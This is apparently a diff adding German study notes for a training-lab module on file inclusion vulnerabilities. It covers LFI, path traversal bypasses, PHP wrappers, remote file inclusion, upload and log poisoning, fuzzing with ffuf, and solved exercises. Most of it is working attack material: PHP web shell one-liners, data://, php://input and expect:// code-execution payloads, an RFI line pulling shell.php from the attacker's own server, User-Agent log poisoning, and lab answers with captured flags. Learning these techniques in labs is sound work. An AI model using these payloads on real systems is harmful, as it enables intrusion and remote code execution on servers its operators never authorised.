@@ -1,0 +1,261 @@
+File Inclusion
+Introduction
+1. Intro to File Inclusions:
+- Viele Backend Sprachen wie PHP, Javascript oder Java verwenden HTTP Parameter um eine Webseite anzuzeigen 
+- Hier werden Ressourcen geladen um die Webseite darzustellen, dies kann wenn nicht richtig gesichert ausgenutzt werden damit alle Lokalen Dateien auf dem Ziel aufgerufen werden koennen
+
+- Local File Inclusion(LFI):
+	- Die meisten LFIs finden wir in Templating Engines
+	- Eine Templating Engine stellt die statischen Teile auf der Webseiten an wie Header,Nav Bar, Footer, usw und laedt die dyanmischen Daten aus einer Datei
+	- Manchmal werden die Dateien mit /index.php?page=about geladen hierbei koennen wir vielleicht andere lokale Dateien laden
+
+- PHP:
+	- Wenn wir PHP verwenden koennen wir mit der Funktion include() ganze Dateien in die Webseite laden
+	- Wenn die Eingabe von dem User nicht gefiltert wird koennen wir diese Schwachstelle ausnutzen
+	- PHP hat andere Funktionen wir include_once(), require(), require_once(), file_get_contents(), usw
+
+- NodeJS:
+	- NodeJS kann ebenfalls Content laden mit einem HTTP Parameter 
+	- Der HTTP Parameter wird von der Funktion readfile verwendet 
+	- In Express.js waere diese Funktion render()
+
+- Java:
+	- In Java gibt es die include Funktion
+	- Die import Funktion rendert lokale Dateien oder eine URL
+
+- .NET:
+	- In .NET gibt es die Funktion Response.WriteFile die mit den obrigen Funktionen vergleichbar ist
+	- Die Funktion @Html.Partial() dient dazu die Inhalte zu rendern
+
+##############################################################################################
+File Disclosure
+1. Local File Inclusion(LFI):
+- Path Traversal:
+	- Wir koennen einen absoluten Dateipfad eingeben
+	- In manchen Faellen fuegt der Server der Eingabe etwas hinzu, dann wuerde ein absoluter Dateipfad nicht funktionieren
+	- Hier koennen wir einen relativen Dateipfad wie ../../../Datei verwenden
+
+- Filename Prefix:
+	- Wenn ein anderes Zeichen in den Parameter eingezogen wird koennen wir diese mit einem / vor dem Parameter bereinigen
+	- Als Beispiel: /../../../Datei
+
+- Appended Extensions:
+	- Manchmal haben HTTP Parameter bestimmte Endungen wie .php, .js uw
+	- Diese koennen auch umgangen werden
+
+- Question:
+	- 1. http://188.166.157.244:30360/index.php?language=../../../../../etc/passwd
+	- 2. http://188.166.157.244:30360/index.php?language=../../../../../usr/share/flags/flag.txt
+
+2. Basic Bypasses:
+- Wir koennen verschiedene Filter mit verschiedenen Techniken umgehen
+
+- Non-Recursive Path Traversal Filters:
+	- Wir koennen in einen relativen Dateipfad mit ../../../../../ verwenden
+	- Wenn ein Filter auf den Output String angewandt wird koennen wir ....//....// verwenden 
+	- Andere Moeglichkeiten sind .../.\ oder ....\/
+
+- Encoding:
+	- Manche Eingaben verwenden Webfilter mit Encoding
+	- In BurpSuite ist ein Decoder Tool vorhanden
+
+- Approved Paths:
+	- Manche Anwendungne ueberpruefen regular expressions um sicherzustellen ob es sich um eine Datei handelt
+	- Die File Inclusions koennen eventuell nur auf vorhandenen Verzeichnisse ausgefuehrt werden
+
+- Path Truncation:
+	- Wir koennen eine Endung wie .php umgehen
+	- Eine Eingabelaenge in PHP ist 4096 lang
+	- ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
+	- echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
+
+- Null Bytes:
+	- PHP Versionen vor 5.5 koennen wir mit null byte injection umgehen
+
+- Question:
+	- URL Encoding von ....//....//....//....//flag.txt
+	- http://138.68.189.23:30329/index.php?language=languages/%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%66%6c%61%67%2e%74%78%74
+
+3. PHP Filters:
+- Wenn wir eine LFI Schwachstlle gefunden haben koennen wir die PHP Wrappers verwenden um die LFI Schwachstelle auszuweiten
+- PHP Wrappers erlauben Zugriff auf verschiedene I/O Streams
+
+- Input Filters:
+	- PHP Filters sind PHP Wrappers die verwendet werden um Daten aus Usereingaben zu filtern und zu validieren
+	- Um PHP Wrappers zu verwenden koennen wir php:// verwenden um einen PHP Filter zu nutzen verwenden wir php://filter/
+
+- Fuzzing for PHP Files:
+	- Mit ffuf koenen wir die verfuegbaren Seiten finden
+	- ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+
+- Source Code Disclosure:
+	- Wenn wir eine Liste von PHP Dateien haben koenenn wir diese mit einem Base64 Filter verwenden um den Quellcode der config Datei anzuzeigen
+	- php://filter/read=convert.base64-encode/resource=config
+
+- Questions:
+	- ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://138.68.128.190:30260/FUZZ.php
+	- http://138.68.128.190:30260/index.php?language=php://filter/read=convert.base64-encode/resource=configure
+	- echo 'Base64_String' | base64 -d
+
+##############################################################################################
+Remote Code Execution
+1. PHP Wrapper:
+- Wir werden lernen wie wir die File Inclusion verwenden koennen um Code auszufuehren
+
+- Data:
+	- Mit dem Data Wrapper koennen wir PHP Code einschleusen
+	- Um den Data Wrapper zu verwenden benoetigen wir allow_url_include Rechte diese sind standardmaessig nicht aktiviert
+	- Checking PHP Konfiguration:
+		- Die PHP Einstellungen koennen unter /etc/php/X.Y/apache2/php.ini fuer Apache und fuer Nginx unter /etc/php/X.Y/fpm/php.ini gefunden werden
+		- curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+
+- Remote Code Execution:
+	- echo '<?php system($_GET["cmd"]); ?>' | base64
+	- http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<Base64_URL>&cmd=id
+
+- Input:
+	- Mit dem Input Wrapper koennen wir ebenfalls Daten senden
+	- Mit Input senden wir die Daten mit einem POST Request
+	- curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+
+- Expect:
+	- Mit dem expect Wrapper koennen wir Befehle sofort ueber den URL Stream ausfuehren lassen
+	- curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+
+- Question:
+	- curl -s 'http://138.68.189.23:30232/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls%20/'
+	- curl -s 'http://138.68.189.23:30232/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt'
+
+2. Remote File Inclusion(RFI)
+- Manchmal muessen wir eine remote Datei einfuegen wenn die Funktion dies erlaubt
+
+- Verify RFI:
+	- Jede URL Inclusion benoetigt allow_url_include Rechte
+	- Wir sollen zuerst mit einer Datei auf dem lokalen User anfangen um zu pruefen ob es funktioniert
+	- http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+
+- Remote Code Execution with RFI:
+	- Die erste Stue ist eine Payload zu schreiben in dem Fall eine Shell 
+	- echo '<?php system($_GET["cmd"]); ?>' > shell.php
+	- Dann erstellen wir einen HTTP/FTP/SMB Server um die Datei zu uebertragen
+		- sudo python3 -m http.server <LISTENING_PORT>
+		- http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
+
+		- sudo python -m pyftpdlib -p 21
+		- http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
+		
+		- impacket-smbserver -smb2support share $(pwd)
+		- http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
+
+- Question:
+	- echo '<?php system($_GET["cmd"]); ?>' > shell.php
+	- sudo python3 -m http.server 7777
+	- http:/10.129.29.114/index.php?language=http://10.10.14.246:7777/shell.php&cmd=ls%20/
+	- http:/10.129.29.114/index.php?language=http://10.10.14.246:7777/shell.php&cmd=cat %20/exercise/flag.txt
+	- Flag = 99a8fc05f033f2fc0cf9a6f9826f83f4
+
+3. LFI and File Uploads:
+- In den meisten Webanwendungen koennen Dateien hochgeladen werden
+
+- Image upload:
+	- Wir koennen PHP Code mit jeglicher Dateiendung hochladen 
+	- echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+	- GIF8 ist der File Content
+	- Dann muessen wir die gif Datei auf dem System ausfuehren
+	- http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
+
+- ZIP Upload:
+	- Wir koennen ebenso den zip wrapper verwenden um php code auszufuehren
+	- echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+	- http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+
+- Phar Upload:
+	- Wir koennen ebenso phar verwenden hierfuer benoetigen wir ein geeignetes PHP Script
+
+- Question:
+	- echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+	- http://159.65.16.219:31325/index.php?language=./profile_images/shell.gif&cmd=ls%20/%20-l
+	- http://159.65.16.219:31325/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt
+		- HTB{upl04d+lf!+3x3cut3=rc3}
+
+4. Log Poisoning:
+- PHP Session Poisoning:
+	- Die meisten Webanwendungen verwenden ein PHPSESSID Cookie 
+	- Meistens werden diese Dateien auf Linux in /var/lib/php/session und unter Windows in C:\Windows\Temp gespeichert
+	- Diese enthalten den Speicherort unserer SessionID mit dem Prefix sess_
+	- http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<Session_ID>
+
+- Server Log Poisoning:
+	- Apache und Nginx haben beide Login Dateien wie access.log und error.log
+	- Access.log beinhaltet Informationen ueber die Anfragen an den Server
+
+- Questions:
+	- 1.
+		- http://159.65.16.219:32529/index.php?language=session_poisoning
+		- http://159.65.16.219:32529/index.php?language=/var/lib/php/sessions/sess_rnl4ktpcuk26nko6c371f8sdjs
+		- http://159.65.16.219:32529/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+		- http://159.65.16.219:32529/index.php?language=/var/lib/php/sessions/sess_rnl4ktpcuk26nko6c371f8sdjs&cmd=pwd
+
+	- 2.
+		- http://159.65.16.219:32529/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+		- http://159.65.16.219:32529/index.php?language=/var/lib/php/sessions/sess_rnl4ktpcuk26nko6c371f8sdjs&cmd=ls%20/
+
+		- http://159.65.16.219:32529/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+		- http://159.65.16.219:32529/index.php?language=/var/lib/php/sessions/sess_rnl4ktpcuk26nko6c371f8sdjs&cmd=cat%20/c85ee5082f4c723ace6c0796e3a3db09.txt
+
+##############################################################################################
+Automation and Prevention:
+1. Automated Scanning:
+- Wir benoetigen ein automatisiertes Tool um File Inclusion Schwachstellen zu identifizieren
+
+- Fuzzing Parameters:
+	- Mit ffuf koennen wir die Seiten ausprobieren um diese spaeter zu verwenden
+	- ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+- LFI Wordlists:
+	- Wir koennen ebenfalls mit ffuf LFI ausprobieren
+	- ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
+- Fuzzing Server Files:
+	- Andere Server Dateien sind Server webroot path, server configuration files und server logs
+
+	- Server Webroot:
+		- Fuer einen Upload Angriff muessen wir den Pfad zum Upload Verzeichniss kennen
+		- ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+- Server Logs/Configurations:
+	- Um Logs- und Konfigurationsdateien zu erreichen benoetigen wir den Pfad zu diesen Dateien 
+	- In SecList gibt es LFI-Jhaddix.txt sonst gibt es auch Wortlisten extra fuer Windows und Linux
+	- ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+- LFI Tools:
+	- Tools zum automatsichen Auffinden von LFI Schwachstellen sind LFISuite, LFiFreak und liffy
+
+- Question:
+	- 188.166.157.244:30137
+	- ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://188.166.157.244:30137/index.php?FUZZ=value' -fs 2309
+
+	- ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://188.166.157.244:30137/index.php?view=FUZZ' -fs 1935
+	- http://188.166.157.244:30137/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt
+
+##############################################################################################
+Skills Assesssment:
+1. Skills Assessment - File Inclusion:
+165.22.122.247:30051
+- ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://165.22.122.247:30051/index.php?FUZZ=value' -fs 15829
+	- page
+- 
+- Decode HTML Site with Base64
+
+- http://165.22.122.247:30051/ilf_admin/index.php
+- http://165.22.122.247:30051/ilf_admin/index.php?log=chat.log
+- ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://165.22.122.247:30051/ilf_admin/index.php?log=FUZZ' -fs 2046
+
+- Burp Suite Repeater:
+	- GET /ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log
+	- User-Agent: <?php system($_GET[cmd]) ?>
+	- GET /ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=pwd
+		- /var/www/html/ilf_admin
+	- GET /ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=ls%20/
+	- GET /ilf_admin/index.php?log=../../../../../../../var/log/nginx/access.log&cmd=cat%20/flag_dacc60f2348d.txt
+		- a9a892dbc9faf9a014f58e007721835e
